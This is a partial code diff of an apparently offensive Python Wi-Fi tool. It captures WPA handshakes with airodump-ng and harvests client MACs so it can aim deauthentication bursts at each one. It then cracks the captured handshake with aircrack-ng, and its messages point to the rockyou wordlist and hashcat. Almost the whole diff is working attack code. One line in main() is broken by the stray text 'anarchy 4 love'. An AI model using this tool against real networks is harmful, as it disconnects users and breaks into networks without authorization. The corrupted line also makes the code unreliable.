                 if output == '' and process.poll() is not None:
@@ -1548,8 +2333,7 @@ def crack_wpa_password(capture_file, bssid):
             process.wait()
         except Exception as e:
             err(f"aircrack-ng error: {e}")
-
-    divider()
+        divider()
 
     if password:
         print()
@@ -1562,15 +2346,23 @@ def crack_wpa_password(capture_file, bssid):
         print()
         return password
     else:
-        err("Password not found in wordlist")
+        err("Password not found across all attack stages")
         return None
 
 
 
+
+
+def capture_handshake(interface, bssid, channel, ssid):
     """
-    Capture WPA handshake using airodump-ng.
-    Runs indefinitely — sends periodic deauth bursts — until a handshake
-    is confirmed by aircrack-ng.  Press Ctrl+C to abort.
+    Capture WPA 4-way handshake using airodump-ng + aireplay-ng.
+
+    Improvements over previous version:
+    - airodump-ng writes CSV alongside pcap so we can read connected client MACs
+    - First deauth fires immediately (t=5s) rather than waiting 60s
+    - Sends broadcast deauth AND individual deauths to each known client
+    - Deauth interval reduced to 30s for faster reconnect forcing
+    - 20 deauth frames per burst (up from 10) for better reliability
     """
     global MONITOR_IFACE
 
@@ -1578,10 +2370,52 @@ def crack_wpa_password(capture_file, bssid):
 
     safe_ssid    = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
     capture_file = f"handshake_{safe_ssid}"
+    csv_base     = f"/tmp/hs_clients_{safe_ssid}"
 
     airodump_proc      = None
     monitor_iface      = None
     handshake_captured = False
+
+    def get_clients_from_csv():
+        """Parse airodump CSV to find client MACs associated to our BSSID."""
+        clients = set()
+        for suffix in ['-01.csv', '-02.csv', '.csv']:
+            csv_path = f"{csv_base}{suffix}"
+            if not os.path.exists(csv_path):
+                continue
+            try:
+                with open(csv_path, 'r', errors='ignore') as fh:
+                    content = fh.read()
+                # Client section is after the blank line separator
+                parts = re.split(r'\n\s*\n', content, maxsplit=1)
+                if len(parts) < 2:
+                    continue
+                for line in parts[1].strip().split('\n')[2:]:
+                    cols = [c.strip() for c in line.split(',')]
+                    if len(cols) >= 6:
+                        client_mac = cols[0].strip()
+                        assoc_bssid = cols[5].strip()
+                        if (re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', client_mac)
+                                and assoc_bssid.lower() == bssid.lower()):
+                            clients.add(client_mac)
+            except Exception:
+                pass
+        return clients
+
+    def send_deauth(mon_iface, target_bssid, client_mac=None):
+        """Send deauth frames. If client_mac given, sends directed deauth too."""
+        cmd = ['sudo', 'aireplay-ng', '--deauth', '20', '-a', target_bssid, mon_iface]
+        try:
+            subprocess.run(cmd, capture_output=True, timeout=15)
+        except Exception:
+            pass
+        if client_mac:
+            cmd_c = ['sudo', 'aireplay-ng', '--deauth', '20',
+                     '-a', target_bssid, '-c', client_mac, mon_iface]
+            try:
+                subprocess.run(cmd_c, capture_output=True, timeout=15)
+            except Exception:
+                pass
 
     try:
         subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
@@ -1595,27 +2429,40 @@ def crack_wpa_password(capture_file, bssid):
         MONITOR_IFACE = monitor_iface
         ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")
 
+        # Run airodump writing both pcap (handshake) and csv (client list)
         cmd = [
             'sudo', 'airodump-ng',
             '--bssid', bssid,
             '--channel', str(channel),
             '-w', capture_file,
-            '--output-format', 'pcap',
+            '--output-format', 'pcap,csv',
+            '--write-interval', '2',
             monitor_iface
         ]
-        airodump_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Also write a separate CSV for client tracking
+        cmd_csv = [
+            'sudo', 'airodump-ng',
+            '--bssid', bssid,
+            '--channel', str(channel),
+            '-w', csv_base,
+            '--output-format', 'csv',
+            '--write-interval', '2',
+            monitor_iface
+        ]
+        airodump_proc     = subprocess.Popen(cmd,     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        airodump_csv_proc = subprocess.Popen(cmd_csv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         print()
         info(f"Capture file:  {c(capture_file + '-01.cap', C.BYELLOW)}")
-        info("Running until a handshake is captured — press  Ctrl+C  to abort")
-        info("Deauth packets will be sent every 60 s to force reconnects")
+        info("Sending deauth every  30 s  — first burst in 5 s")
+        info("Press  Ctrl+C  to abort")
         print()
 
         start_time      = time.time()
-        last_deauth     = start_time
-        deauth_interval = 60   # send deauth every 60 s
-        check_interval  = 5    # check for handshake every 5 s
-        elapsed_display = 0
+        last_deauth     = start_time - 25   # first deauth fires at t=5s
+        deauth_interval = 30
+        check_interval  = 3
+        known_clients   = set()
 
         while not handshake_captured:
             if airodump_proc.poll() is not None:
@@ -1624,53 +2471,62 @@ def crack_wpa_password(capture_file, bssid):
 
             now = time.time()
 
-            # ── periodic deauth burst ───────────────────────────────
+            # ── deauth burst ────────────────────────────────────────
             if now - last_deauth >= deauth_interval:
-                try:
-                    subprocess.run(
-                        ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, monitor_iface],
-                        capture_output=True, timeout=20
-                    )
-                    last_deauth = now
-                    info(f"Deauth burst sent  ·  elapsed {int(now - start_time)}s")
-                except Exception:
-                    pass
+                last_deauth = now
+                # Refresh client list from CSV
+                fresh_clients = get_clients_from_csv()
+                known_clients.update(fresh_clients)
 
-            # ── check for handshake ─────────────────────────────────
+                # Broadcast deauth
+                send_deauth(monitor_iface, bssid)
+
+                # Directed deauth to each known client
+                for client in known_clients:
+                    send_deauth(monitor_iface, bssid, client)
+
+                client_str = f"  ({len(known_clients)} client(s) targeted)" if known_clients else ""
+                elapsed    = int(now - start_time)
+                info(f"Deauth burst sent · elapsed {elapsed}s{client_str}")
+
+            # ── handshake check ─────────────────────────────────────
             for suffix in ['-01.cap', '-02.cap', '-03.cap', '-04.cap', '.cap']:
-                cap_file = f"{capture_file}{suffix}"
-                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
+                cap_path = f"{capture_file}{suffix}"
+                if os.path.exists(cap_path) and os.path.getsize(cap_path) > 100:
                     try:
-                        chk = subprocess.run(['aircrack-ng', cap_file],
+                        chk = subprocess.run(['aircrack-ng', cap_path],
                                              capture_output=True, text=True, timeout=15)
                         if 'WPA (1 handshake)' in chk.stdout or 'WPA (2 handshake' in chk.stdout:
                             handshake_captured = True
-                            elapsed            = int(time.time() - start_time)
-                            ok(f"Handshake captured!  {c(cap_file, C.BWHITE)}  "
-                               f"(elapsed {elapsed}s)")
+                            elapsed = int(time.time() - start_time)
+                            print()
+                            ok(f"Handshake captured!  {c(cap_path, C.BWHITE)}  (elapsed {elapsed}s)")
                             break
                     except Exception:
                         pass
 
             if not handshake_captured:
                 elapsed_display = int(time.time() - start_time)
-                mins, secs = divmod(elapsed_display, 60)
-                print(f"\r  {c('◆', C.BCYAN, C.BOLD)}  Waiting for handshake…  "
+                mins, secs      = divmod(elapsed_display, 60)
+                next_deauth     = max(0, int(deauth_interval - (time.time() - last_deauth)))
+                client_count    = len(known_clients)
+                print(f"\r  {c('◆', C.BCYAN, C.BOLD)}  Waiting…  "
                       f"{c(f'{mins:02d}:{secs:02d}', C.BYELLOW)}  "
-                      f"(next deauth in {max(0, deauth_interval - int(time.time()-last_deauth))}s)   ",
+                      f"clients: {c(str(client_count), C.BCYAN)}  "
+                      f"next deauth: {c(str(next_deauth) + 's', C.DIM)}   ",
                       end='', flush=True)
                 time.sleep(check_interval)
-
-        print()   # newline after \r status line
 
     except KeyboardInterrupt:
         print()
         warn("Capture interrupted by user")
 
     finally:
-        if airodump_proc and airodump_proc.poll() is None:
-            airodump_proc.terminate()
-            time.sleep(1)
+        for proc in [airodump_proc, airodump_csv_proc if 'airodump_csv_proc' in dir() else None]:
+            if proc and proc.poll() is None:
+                try: proc.terminate()
+                except Exception: pass
+        time.sleep(1)
         if monitor_iface:
             subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                            capture_output=True, timeout=10)
@@ -1935,7 +2791,7 @@ def main():
         sys.exit(0)
 
     if not selected.channel:
-        selected = selected._replace(channel=1)
+        selected = selected._replace(channel=1)anarchy 4 love
         warn("Channel unknown — defaulting to ch 1")
 
     # ── Attack routing based on security type ─────────────
@@ -2007,10 +2863,13 @@ def main():
     else:
         section("No Password Found")
         warn("The password was not in the wordlist")
-        info("Suggestions:")
-        print(f"    {c('1.', C.BYELLOW)} Use rockyou.txt or a larger wordlist")
-        print(f"    {c('2.', C.BYELLOW)} Try hashcat with rule-based mutation")
-        print(f"    {c('3.', C.BYELLOW)} The network may use a strong random key")
+        info("To improve your chances:")
+        print(f"    {c('1.', C.BYELLOW)} Place rockyou.txt at  {c('/opt/wordlists/rockyou.txt', C.BWHITE)}  and re-run")
+        print(f"       Download: {c('https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt', C.DIM)}")
+        print(f"    {c('2.', C.BYELLOW)} Provide your own wordlist — the tool will prompt you next run")
+        print(f"    {c('3.', C.BYELLOW)} Try hashcat rule-based mutation:")
+        print(f"       {c('hashcat -m 22000 <hash.hc22000> rockyou.txt -r /usr/share/hashcat/rules/best64.rule', C.DIM)}")
+        print(f"    {c('4.', C.BYELLOW)} The network may use a strong random key (unlikely to crack)")
 
     cleanup()
     section("Session Complete")
